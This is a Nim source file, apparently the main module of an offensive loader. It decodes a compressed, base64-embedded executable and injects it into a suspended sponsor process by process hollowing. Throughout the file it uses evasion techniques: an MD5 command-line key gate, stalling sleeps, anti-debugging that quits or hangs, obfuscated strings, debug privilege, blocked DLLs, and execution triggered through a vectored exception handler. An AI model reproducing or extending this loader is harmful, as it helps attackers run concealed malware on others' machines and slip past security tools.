# Internal
import utils
import params
import antidebug
# External
import os
import md5
import winim
import strutils
import nimprotect
import supersnappy
from std/base64 import decode

# Import per module chosen
when defined(hollow1):
    import hollow1
when defined(hollow2) or defined(hollow3):
    import hollow23
when defined(hollow4):
    import hollow4
when defined(hollow5) or defined(hollow6):
    import hollow56

# Raising VEH
{.emit: """
#include <windows.h>
void raiseVEH() {
    int x = 4 / 0;
}
""".}
proc raiseVEH(): void {.importc: protectString("raiseVEH"), nodecl.}


proc validateKey(commandLineParams: seq[string]) = 
    var pass = false
    for arg in commandLineParams:
        if keyMd5 == getMd5(arg):
            pass = true
            break
    if not pass:
        quit(1)


proc execute(compressedBase64PE: string, sponsorCmd: string = getAppFilename(), isBlockDlls: bool, sleepSeconds: int = 0): bool =
    
    # Check if key in command line
    let commandLineParams = commandLineParams()
    if keyMd5 != "":
        when defined(hollow4) or defined(hollow5) or defined(hollow6):
            if protectString("-M") in commandLineParams:
                validateKey(commandLineParams)
        else:
            validateKey(commandLineParams)

    # Decode and decompress PE
    var compressedPe = decode(compressedBase64PE)
    var peStr = uncompress(compressedPe)

    # Check hollowsplitted args 
    when defined(hollow4) or defined(hollow5) or defined(hollow6):
        for i in commandLineParams:
            if i.startsWith(protectString("-A:")) or i.startsWith(protectString("-W:")) or i.startsWith(protectString("-T:")) or i.startsWith(protectString("-R:")):
                # This is a worker process in splitted hollow, let it go
                when defined(hollow4):
                    return hollow4Worker(peStr)
                when defined(hollow5) or defined(hollow6):
                    return hollow56Worker(peStr)
        if not (protectString("-M") in commandLineParams):
            quit(1)

    # Sleep at execution
    sleepUselessCalculations(sleepSeconds)

    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
        if antiDebugAction == protectString("die"):
            quit(1)
        elif antiDebugAction == protectString("troll"):
            sleepUselessCalculations(999999999)

    # Enable debug privilege
    discard setDebugPrivilege()

    # Create suspended process with extended attributes (block dll's)
    var ppi: PPROCESS_INFORMATION = createSuspendedExtendedProcess(sponsorCmd, isBlockDlls)

    # Execute module
    when defined(hollow1):
        return hollow1(peStr, ppi)
    when defined(hollow2) or defined(hollow3):
        return hollow23(peStr, ppi)
    when defined(hollow4):
        return hollow4Manager(peStr, ppi)
    when defined(hollow5) or defined(hollow6):
        return hollow56Manager(peStr, ppi)


proc wrap_execute() =
    discard execute(
        compressedBase64PE = compressedBase64PE, 
        sponsorCmd = sponsorPath & sponsorParams,
        isBlockDlls = isBlockDlls,
        sleepSeconds = sleepSeconds
    )
    quit(0)


proc main*() =
    if isVeh:
        AddVectoredExceptionHandler(1, cast[PVECTORED_EXCEPTION_HANDLER](wrap_execute))
        raiseVEH()
    else:
        wrap_execute()


when isMainModule:
    main()